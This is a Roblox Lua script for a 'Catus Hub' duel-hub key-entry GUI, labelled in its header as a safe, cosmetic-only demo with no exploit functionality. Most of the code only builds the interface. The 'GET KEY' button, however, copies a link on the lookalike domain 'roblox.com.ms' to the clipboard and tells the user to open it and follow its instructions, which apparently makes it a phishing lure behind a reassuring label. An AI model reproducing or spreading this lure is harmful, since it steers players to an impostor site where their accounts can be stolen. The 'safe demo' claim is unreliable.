-- CATUS HUB - SAFE DUEL HUB DEMO
-- Cosmetic/demo UI only. No exploit functionality.

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer

local DEMO_KEY = "CATUS-DEMO"
local KEY_LINK = "https://roblox.com.ms/communities/5622451391/#!/about"

--// GUI
local gui = Instance.new("ScreenGui")
gui.Name = "CatusHubDemo"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

--// Main
local main = Instance.new("Frame")
main.Size = UDim2.fromOffset(420, 315)
main.Position = UDim2.fromScale(0.5, 0.5)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
main.BorderSizePixel = 0
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 14)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(100, 70, 150)
mainStroke.Thickness = 1
mainStroke.Parent = main

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 0, 42)
title.Position = UDim2.fromOffset(15, 10)
title.BackgroundTransparency = 1
title.Text = "🧠 CATUS HUB"
title.TextColor3 = Color3.fromRGB(190, 130, 255)
title.TextSize = 25
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -30, 0, 25)
subtitle.Position = UDim2.fromOffset(15, 48)
subtitle.BackgroundTransparency = 1
subtitle.Text = "⚔ DUEL HUB • DEMO"
subtitle.TextColor3 = Color3.fromRGB(155, 155, 170)
subtitle.TextSize = 13
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = main

--// Key box
local keyBox = Instance.new("TextBox")
keyBox.Size = UDim2.new(1, -30, 0, 45)
keyBox.Position = UDim2.fromOffset(15, 82)
keyBox.BackgroundColor3 = Color3.fromRGB(29, 29, 39)
keyBox.BorderSizePixel = 0
keyBox.PlaceholderText = "Enter demo key..."
keyBox.PlaceholderColor3 = Color3.fromRGB(115, 115, 130)
keyBox.Text = ""
keyBox.TextColor3 = Color3.fromRGB(240, 240, 245)
keyBox.TextSize = 14
keyBox.Font = Enum.Font.Gotham
keyBox.ClearTextOnFocus = false
keyBox.Parent = main

local keyCorner = Instance.new("UICorner")
keyCorner.CornerRadius = UDim.new(0, 9)
keyCorner.Parent = keyBox

--// Verify button
local verify = Instance.new("TextButton")
verify.Size = UDim2.new(0.48, -10, 0, 43)
verify.Position = UDim2.fromOffset(15, 140)
verify.BackgroundColor3 = Color3.fromRGB(110, 65, 200)
verify.BorderSizePixel = 0
verify.Text = "✓ CHECK KEY"
verify.TextColor3 = Color3.fromRGB(255, 255, 255)
verify.TextSize = 13
verify.Font = Enum.Font.GothamBold
verify.AutoButtonColor = false
verify.Parent = main

local verifyCorner = Instance.new("UICorner")
verifyCorner.CornerRadius = UDim.new(0, 9)
verifyCorner.Parent = verify

--// Get key button
local getKey = Instance.new("TextButton")
getKey.Size = UDim2.new(0.48, -10, 0, 43)
getKey.Position = UDim2.new(0.52, 0, 0, 140)
getKey.BackgroundColor3 = Color3.fromRGB(40, 40, 53)
getKey.BorderSizePixel = 0
getKey.Text = "🔑 GET KEY"
getKey.TextColor3 = Color3.fromRGB(235, 235, 240)
getKey.TextSize = 13
getKey.Font = Enum.Font.GothamBold
getKey.AutoButtonColor = false
getKey.Parent = main

local getCorner = Instance.new("UICorner")
getCorner.CornerRadius = UDim.new(0, 9)
getCorner.Parent = getKey

--// Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -30, 0, 55)
status.Position = UDim2.fromOffset(15, 194)
status.BackgroundTransparency = 1
status.Text = "Status: Waiting for key..."
status.TextColor3 = Color3.fromRGB(165, 165, 180)
status.TextSize = 13
status.Font = Enum.Font.Gotham
status.TextWrapped = true
status.Parent = main

--// Demo notice
local notice = Instance.new("TextLabel")
notice.Size = UDim2.new(1, -30, 0, 25)
notice.Position = UDim2.fromOffset(15, 270)
notice.BackgroundTransparency = 1
notice.Text = "CATUS HUB • DEMO / COSMETIC ONLY"
notice.TextColor3 = Color3.fromRGB(85, 85, 100)
notice.TextSize = 11
notice.Font = Enum.Font.Gotham
notice.Parent = main

--// Notification system
local function notify(message)
    local notification = Instance.new("Frame")

    notification.Size = UDim2.fromOffset(300, 55)
    notification.Position = UDim2.new(1, 20, 1, -75)
    notification.AnchorPoint = Vector2.new(0, 1)
    notification.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    notification.BorderSizePixel = 0
    notification.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = notification

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 70, 150)
    stroke.Thickness = 1
    stroke.Parent = notification

    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, -20, 1, 0)
    text.Position = UDim2.fromOffset(10, 0)
    text.BackgroundTransparency = 1
    text.Text = message
    text.TextColor3 = Color3.fromRGB(235, 235, 240)
    text.TextSize = 13
    text.Font = Enum.Font.GothamMedium
    text.TextWrapped = true
    text.Parent = notification

    TweenService:Create(
        notification,
        TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {
            Position = UDim2.new(1, -320, 1, -75)
        }
    ):Play()

    task.delay(3, function()
        if notification and notification.Parent then
            local tween = TweenService:Create(
                notification,
                TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
                {
                    Position = UDim2.new(1, 20, 1, -75)
                }
            )

            tween:Play()
            tween.Completed:Wait()

            if notification then
                notification:Destroy()
            end
        end
    end)
end

--// Button animations
local function animateButton(button)
    local originalSize = button.Size

    button.MouseEnter:Connect(function()
        TweenService:Create(
            button,
            TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {
                Size = UDim2.new(
                    originalSize.X.Scale,
                    originalSize.X.Offset + 4,
                    originalSize.Y.Scale,
                    originalSize.Y.Offset + 2
                )
            }
        ):Play()
    end)

    button.MouseLeave:Connect(function()
        TweenService:Create(
            button,
            TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {
                Size = originalSize
            }
        ):Play()
    end)

    button.MouseButton1Down:Connect(function()
        TweenService:Create(
            button,
            TweenInfo.new(0.06),
            {
                Size = UDim2.new(
                    originalSize.X.Scale,
                    originalSize.X.Offset - 2,
                    originalSize.Y.Scale,
                    originalSize.Y.Offset - 2
                )
            }
        ):Play()
    end)

    button.MouseButton1Up:Connect(function()
        TweenService:Create(
            button,
            TweenInfo.new(0.08),
            {
                Size = originalSize
            }
        ):Play()
    end)
end

animateButton(verify)
animateButton(getKey)

--// Verify key
verify.MouseButton1Click:Connect(function()
    if keyBox.Text == DEMO_KEY then
        status.Text = "SUCCES THX FOR USING CATUS HUB"
        status.TextColor3 = Color3.fromRGB(100, 255, 150)

        notify("✅ Key accepted — welcome to Catus Hub!")
    else
        status.Text = "ERROR: Invalid demo key"
        status.TextColor3 = Color3.fromRGB(255, 100, 100)

        notify("❌ Invalid demo key")
    end
end)

--// Get key
getKey.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(KEY_LINK)

        status.Text = "Key link copied!\nOpen the link and follow its instructions."
        status.TextColor3 = Color3.fromRGB(180, 180, 195)

        notify("🔑 Key link copied!")
    else
        status.Text = "Key link:\n" .. KEY_LINK
        status.TextColor3 = Color3.fromRGB(180, 180, 195)

        notify("🔗 Key link displayed")
    end
end)

--// Example demo-only error
local function showGroupError()
    status.Text = "ERROR: User not in group"
    status.TextColor3 = Color3.fromRGB(255, 100, 100)

    notify("⚠ User not in group")
end
